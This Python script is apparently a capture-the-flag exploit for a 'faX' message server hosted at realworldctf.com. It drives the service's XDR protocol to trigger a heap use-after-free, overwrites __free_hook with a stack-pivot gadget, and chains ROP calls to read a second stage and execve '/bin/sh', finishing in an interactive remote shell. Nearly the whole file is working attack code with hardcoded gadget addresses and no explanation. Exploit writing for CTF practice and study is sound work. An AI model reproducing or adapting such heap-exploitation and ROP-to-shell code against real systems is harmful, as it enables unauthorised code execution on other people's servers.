#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import xdrlib

bin_file = './server'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'tcp.realworldctf.com', 'port':10917})
env.select()

#==========

binf = ELF(bin_file)
addr_read           = 0x0044a160

addr_bss            = binf.sep_section['.bss']
addr_free_hook      = 0x006bee98

addr_xchg_rdi_rsp   = 0x0041b6e4
addr_syscall        = 0x00401eac

#==========

def attack(conn, **kwargs):
    fax = faX(conn)

    fax.add_contacts([('hoge', '1.1.1.1')])

    fax.add_message(0, 'a'*8)   # 0
    fax.delete_message(0)
    fax.add_message(0, None)    # 0
    fax.delete_message(0)

    fax.add_message(0, p64(addr_free_hook))     # 0
    fax.add_message(0, 'xxxxxxxx')              # 1
    fax.add_message(0, p64(addr_xchg_rdi_rsp))  # 2

    rop = ROP(binf)
    rop.call(addr_read, [constants.STDIN_FILENO, addr_bss, 0x100])
    rop.migrate(addr_bss + 8)
    exploit = str(rop)

    fax.add_message(0, exploit)                 # 3

    p = xdrlib.Packer()
    p.pack_int(6)
    p.pack_int(3)   # idx
    conn.send(p.get_buffer())
    sleep(0.1)

    rop = ROP(binf)
    rop.raw(rop.rax)
    rop.raw(constants.SYS_execve)
    rop.call(addr_syscall, [addr_bss, 0, 0])
    exploit  = '/bin/sh\x00'
    exploit += str(rop)
    conn.send(exploit)

class faX:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        if env.check('debug'):
            self.recvuntil('\n')

    def add_contacts(self, contacts):
        p = xdrlib.Packer()
        p.pack_int(1)
        p.pack_int(len(contacts))
        for ct in contacts:
            for s in ct:
                p.pack_string(s)

        self.send(p.get_buffer())

        up = xdrlib.Unpacker(self.recv(0x1000))
        return up.unpack_bytes()

    def list_contacts(self):
        p = xdrlib.Packer()
        p.pack_int(2)
        self.send(p.get_buffer())

        ret = []
        while True:
            try:
                up = xdrlib.Unpacker(self.recv(0x1000, timeout=1))
                ret += [up.unpack_bytes()]
            except:
                break
        return ret 

    def delete_contact(self, idx):
        p = xdrlib.Packer()
        p.pack_int(3)
        p.pack_int(idx)
        self.send(p.get_buffer())

        up = xdrlib.Unpacker(self.recv(0x1000))
        return up.unpack_bytes()

    def add_message(self, idx, msg):
        p = xdrlib.Packer()
        p.pack_int(4)
        p.pack_int(idx)
        if msg is not None:
            p.pack_bytes(msg)
        else:
            p.pack_int(-1)
        self.send(p.get_buffer())

        up = xdrlib.Unpacker(self.recv(0x1000))
        return up.unpack_bytes()

    def list_messages(self):
        p = xdrlib.Packer()
        p.pack_int(5)
        self.send(p.get_buffer())

        ret = []
        while True:
            try:
                up = xdrlib.Unpacker(self.recv(0x1000, timeout=1))
                ret += [up.unpack_bytes()]
            except:
                break
        return ret 

    def delete_message(self, idx):
        p = xdrlib.Packer()
        p.pack_int(6)
        p.pack_int(idx)
        self.send(p.get_buffer())

        up = xdrlib.Unpacker(self.recv(0x1000))
        return up.unpack_bytes()

    def send_message(self, idx):
        p = xdrlib.Packer()
        p.pack_int(7)
        p.pack_int(idx)
        self.send(p.get_buffer())

        up = xdrlib.Unpacker(self.recv(0x1000))
        return up.unpack_bytes()

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
